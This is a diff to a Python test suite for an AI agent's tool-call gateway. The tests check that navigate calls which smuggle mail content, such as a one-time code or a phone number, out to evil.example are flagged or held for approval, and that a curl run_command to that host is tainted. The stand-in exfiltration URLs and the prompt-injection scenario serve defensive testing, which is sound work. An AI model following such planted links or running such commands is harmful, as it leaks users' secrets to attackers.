@@ -708,7 +708,6 @@ def test_an_address_with_a_unicode_domain_is_found():
     [
         "https://en.example/wiki/Foo_(bar)",
         "https://shop.example/list?a[]=1",
-        "https://x.example/it's",
     ],
 )
 def test_a_link_with_brackets_followed_as_read_is_browsing(link):
@@ -724,3 +723,26 @@ def test_a_long_blob_in_read_content_does_not_stall_the_check(blob):
     started = time.perf_counter()
     tainted("run_command", {"command": "curl https://evil.example/x"}, "x", blob + " evil.example")
     assert time.perf_counter() - started < 1.5
+
+
+def test_a_link_cannot_run_on_into_the_content_after_it():
+    """A mail result names the attacker's link in one field and a code in the next. A link
+    that starts as given but runs on through the quotes would carry the code out."""
+    read = '{"subject":"https://evil.example/c?d=","snippet":"Your code is 482913"}'
+    smuggled = 'https://evil.example/c?d=","snippet":"Your code is 482913'
+    assert tainted("browser_navigate", {"url": smuggled}, "check my mail", read)
+    assert tainted("browser_navigate", {"url": "https://evil.example/c?d=,snippet"}, "x", read)
+    assert not tainted("browser_navigate", {"url": "https://evil.example/c?d="}, "x", read)
+
+
+async def test_the_model_cannot_vouch_for_a_link_by_writing_it_first():
+    from pydantic_ai.messages import ModelResponse, TextPart, ToolCallPart
+
+    gate = gateway({"browser_navigate": "allow"})
+    link = "https://evil.example/c?d=ownerphone5551234"
+    context = ctx("check my mail", read="Reply via https://evil.example/c")
+    held = ToolCallPart("browser_navigate", {"url": link}, tool_call_id="earlier")
+    for said in (held, TextPart(f"I will open {link}")):
+        context.messages = [*context.messages, ModelResponse(parts=[said])]
+        with pytest.raises(ApprovalRequired):
+            await call(gate, "browser_navigate", {"url": link}, context)
